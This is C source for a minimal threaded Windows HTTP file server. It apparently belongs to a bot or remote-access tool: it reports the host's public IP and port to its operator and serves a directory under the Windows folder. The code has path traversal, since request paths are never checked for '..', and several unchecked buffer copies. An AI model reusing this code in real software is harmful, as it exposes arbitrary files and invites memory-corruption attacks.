#include "stdafx.h"

SETUP setup;
int Http_need;

int HttpServer(WORD state, int port, char *root)
{
	static DWORD dwHttpThreadId = NULL;
	static HANDLE hHttpThread = NULL;
	char path[MAX_PATH];

	GetWindowsDirectory(path, MAX_PATH);
	lstrcat(path, "\\Config\\www");

	setup.port = port;
	setup.proxy_allowed = 0;
	strncpy(setup.root, root ? root : path, sizeof(setup.root));

	if(state==ENABLE) {
		Http_need = 1;
		deb("enabling httpd on %d.\n", setup.port);
		hHttpThread = xCreateThread(NULL, 0, CoreHttp, (void*)&setup, 0, &dwHttpThreadId);
		if(hHttpThread==NULL) {
			udpdeb("xCreateThread for Http failed (%d)\n", GetLastError());
			return ERR;
		}
		return dwHttpThreadId;
	}
	else if(state==DISABLE) {
		udpdeb("disabling httpd.\n");
		Http_need = 0;
		return SUCCESS;
	}

	return ERR;
}

DWORD WINAPI CoreHttp(LPVOID mysetup)
{
	SETUP *info;
	WSADATA wsaData;
	DWORD spId = NULL;
	HANDLE hsThread = NULL;
	SOCKET s_socket;
	DWORD nonBlock = 1;

	info = (SETUP*)mysetup;

	if(info->port<=0) {
		udpdeb("erroneous port for Http:%d\n", info->port);
	}

	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);

	if(iResult!=NO_ERROR) {
		deb("Error at WSAStartup()\n");
		ExitThread(ERR);
	}

	s_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if(s_socket==INVALID_SOCKET) {
		deb("Error at socket(): %ld\n", WSAGetLastError());
		udpdeb("Http:socket() failed. err:%d\n", WSAGetLastError());
		ExitThread(ERR);
	}

	sockaddr_in service;

	service.sin_family = AF_INET;
	service.sin_addr.s_addr = INADDR_ANY;
	service.sin_port = htons(info->port);

	if(bind(s_socket, (SOCKADDR*)&service, sizeof(service))==SOCKET_ERROR)
	{
		deb("Http port %d: bind() failed. err:%d\n", ntohs(service.sin_port), WSAGetLastError());
		closesocket(s_socket);
		ExitThread(ERR);
	}

	if(listen(s_socket, SOMAXCONN)==SOCKET_ERROR)
	{
		deb("Error listening on socket.\n");
		deb("Http listen() failed.\n");
		closesocket(s_socket);
		ExitThread(ERR);
	}

	if(!strstr(GetLocalInetAddr(), "192.168.")&&!strstr(GetLocalInetAddr(), "127.0.0.1"))
		udpdeb("Http=%s:%d\n", GetLocalInetAddr(), info->port);

	SOCKET AcceptSocket;

	ioctlsocket(s_socket, FIONBIO, &nonBlock);

	deb("main http started, chrooted to '%s' \n", info->root);

	for(;;)
	{
		AcceptSocket = INVALID_SOCKET;
		while(AcceptSocket==INVALID_SOCKET)
		{
			AcceptSocket = accept(s_socket, NULL, NULL);
			Sleep(100);
			if(!Http_need)
			{
				closesocket(s_socket);
				if(AcceptSocket!=INVALID_SOCKET)
					closesocket(AcceptSocket);
				ExitThread(SUCCESS);
			}
		}
		info->s = AcceptSocket;
		hsThread = xCreateThread(NULL, 0, ProcessHttpClient, (void*)info, 0, &spId);
		if(spId==NULL)
			udpdeb("xCreateThread for Http failed: %s\n", FORMATERROR);
	}
}

DWORD WINAPI ProcessHttpClient(LPVOID s)
{
	char headers[HEADERS_BUF];
	SETUP *set = (SETUP*)s;
	SOCKET client = set->s;
	DWORD nonBlock = 0;
	REQUEST request;
	char url[MAX_PATH];
	HANDLE file;
	DWORD fsize;
	char *file_buffer;
	DWORD wRead, msg_len;
	char buffer[1024];

	deb("processing socket=%d\n", client);
	ioctlsocket(client, FIONBIO, &nonBlock); /* make it blocking */

	if(HttpReadHeaders(client, headers)==-1) {
		deb("error happend while recieving headers.\n");
		closesocket(client);
		ExitThread(0);
	}
	deb("HEADERS:\n%s\nEND OF HEADERS.\n", headers);

	if(ParseHeaders(client, headers, &request)==-1) {
		deb("error happend while parsing headers.\n");
		closesocket(client);
		ExitThread(0);
	}
	if(MakeLocalPath(url, request.url, set->root)==1) {
		HttpListing(client, set->root);
		closesocket(client);
		ExitThread(0);
	}
	deb("local path: '%s'\n", url);

	if(FileAccess(url, GENERIC_ALL)!=0)
	{
		if(SetCurrentDirectory(url))
		{
			HttpListing(client, url);
			closesocket(client);
			ExitThread(0);
		}
		else
		{
			HttpMessage(client, 200, "Malformed request. ip will be logged.\n");
			closesocket(client);
			ExitThread(0);
		}
	}


	file = CreateFile(url, GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(file==INVALID_HANDLE_VALUE)
	{
		HttpMessage(client, 200, "Access denied.\n");
		closesocket(client);
		ExitThread(0);
	}

	fsize = GetFileSize(file, NULL);

	file_buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fsize);
	if(file_buffer==NULL) {
		HttpMessage(client, 200, "Internal error. Low on memory.\n");
		closesocket(client);
		ExitThread(0);
	}

	ReadFile(file, file_buffer, fsize, &wRead, NULL);
	if(wRead!=fsize) {
		HttpMessage(client, 200, "Internal error. I/O error.\n");
		closesocket(client);
		ExitThread(0);
	}

	CloseHandle(file);
	msg_len = wRead;
	wsprintf(buffer, "HTTP/1.0 %d OK\nServer: %s\nContent-type: %s\nContent-Length: %d\nConnection: Close\n\n",
		200, INTERNAL_VERSION, GetContentType(url), msg_len);

	send(client, buffer, strlen(buffer), 0);
	send(client, file_buffer, msg_len, 0);
	f(file_buffer);

	closesocket(client);
	ExitThread(0);
}

int
HttpListing(SOCKET client, char *root)
{
	WIN32_FIND_DATA wfd;
	HANDLE ff;
	char buffer[32768];
	char file_path[MAX_PATH];
	DWORD msg_len;

	SetCurrentDirectory(root);
	if((ff = FindFirstFile("*.*", &wfd))==INVALID_HANDLE_VALUE) {
		HttpMessage(client, 200, "Internal error. FindFirstFile: I/O error . ");
		return -1;
	}
	wsprintf(buffer, "<html><body bgcolor=black><font color=red>warning. this is a property of a broken civilization.<br><br>");
	wsprintf(file_path, "<a href=%s>%s</a><br>", strlen(wfd.cAlternateFileName)>1 ? wfd.cAlternateFileName : wfd.cFileName,
		strlen(wfd.cAlternateFileName)>1 ? wfd.cAlternateFileName : wfd.cFileName);
	lstrcat(buffer, file_path);

	while(FindNextFile(ff, &wfd)) {
		if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			lstrcat(wfd.cFileName, "\\");
			if(wfd.cAlternateFileName)
				lstrcat(wfd.cAlternateFileName, "\\");
		}
		wsprintf(file_path, "<a href=%s>%s</a><br>", strlen(wfd.cAlternateFileName)>1 ? wfd.cAlternateFileName : wfd.cFileName,
			strlen(wfd.cAlternateFileName)>1 ? wfd.cAlternateFileName : wfd.cFileName);
		lstrcat(buffer, file_path);
	}

	FindClose(ff);
	wsprintf(file_path, "<br><br>..: %s :..", INTERNAL_VERSION);
	lstrcat(buffer, file_path);
	msg_len = strlen(buffer);
	wsprintf(file_path, "HTTP/1.0 %d OK\nServer: %s\nContent-type: text/html\nContent-Length: %d\nConnection: Close\n\n",
		200, INTERNAL_VERSION, msg_len);

	send(client, file_path, strlen(file_path), 0);
	send(client, buffer, msg_len, 0);
	return 0;
}

char *
GetContentType(char *url)
{
	if(strstr(url, ".txt"))
		return "text/plain";
	if(strstr(url, ".htm"))
		return "text/html";
	if(strstr(url, ".jpg"))
		return "image/jpg";
	if(strstr(url, ".gif"))
		return "image/gif";
	if(strstr(url, ".png"))
		return "image/png";

	return "text/plain";
}
int
HttpMessage(SOCKET client, int code, char *msg)
{
	char buffer[1024];
	char headers[1024];
	int msg_len;

	strncpy(buffer, HTTP_MESSAGE_TEMPLATE, sizeof(buffer));
	rep(buffer, "%message", msg);
	msg_len = strlen(buffer);
	wsprintf(headers, "HTTP/1.0 %d OK\nServer: %s\nContent-type: text/html\nContent-Length: %d\nConnection: Close\n\n",
		code, INTERNAL_VERSION, msg_len);

	send(client, headers, strlen(headers), 0);
	send(client, buffer, msg_len, 0);
	return 0;
}

int
MakeLocalPath(char *url, char *requrl, char *root)
{
	char index_path[MAX_PATH];

	deb("makelocalpath: processing path: '%s'\n", requrl);
	if(requrl[0]=='/' && requrl[1]==0x0) {
		deb("listing requested.\n");
		strncpy(index_path, root, MAX_PATH);
		strcat(index_path, "\\index.htm");
		if(FileAccess(index_path, GENERIC_ALL)==0) {
			strcpy(url, index_path);
		}
		else {
			strcat(index_path, "l");
			if(FileAccess(index_path, GENERIC_ALL)==0)
				strcpy(url, index_path);
			else {
				deb("no index.htm or index.html files found. generating listing.\n");
				return 1;
			}
		}
		return 0;
	}
	rep(requrl, "/", "\\");
	wsprintf(url, "%s%s", root, requrl);
	return 0;
}

int
ParseHeaders(SOCKET client, char *headers, REQUEST *request)
{
	char *p;

	memset(request, 0x0, sizeof(REQUEST));
	if(sscanf(headers, "%s %[^ ] %s", request->method, request->url, request->version)!=3) {
		deb("Malformed headers. ip will be logged.\n");
		HttpMessage(client, 200, "Malformed headers. ip will be logged.\n");
		MarkHackerIp(client);
		return -1;
	}
	if(p = strstr(headers, "Host: "))
		sscanf(p, "Host: %s", request->host);
	if(p = strstr(headers, "Connection: "))
		sscanf(p, "Connection: %s", request->connection);

	deb("request->method: %s\n", request->method);
	deb("request->url: %s\n", request->url);
	deb("request->version: %s\n", request->version);
	deb("request->host: %s\n", request->host);
	deb("request->connection: %s\n", request->connection);
	return 0;
}

int
HttpReadHeaders(SOCKET client, char *headers)
{
	char buffer[HEADERS_BUF];
	int wRead = 0, wTotal = 0;

	deb("Recieving headers..\n");

	memset(buffer, 0x0, sizeof(buffer));

	for(;;) {
		wRead = recv(client, buffer+wTotal, sizeof(buffer)-wTotal, 0);
		if(!wRead) {
			deb("connection closed by remote.\n");
			return -1;
		}
		else if(wRead==SOCKET_ERROR) {
			deb("recv: %s\n", fmterr(WSAGetLastError()));
			return -1;
		}
		wTotal += wRead;
		deb("read %d bytes.\n[%s]\n", wRead, buffer);
		if(wTotal>=sizeof(buffer)) {
			deb("buffer overflow, truncated to %d bytes.\n", wTotal);
			break;
		}

		//hexdump(buffer,sizeof(buffer));
		if(strstr(buffer, "\r\n\r\n")) {
			deb("recieved all headers. %d bytes.\n", wTotal);
			break;
		}
	}

	strncpy(headers, buffer, wTotal);
	return wTotal;
}

int MarkHackerIp(SOCKET client)
{
	return 0;
}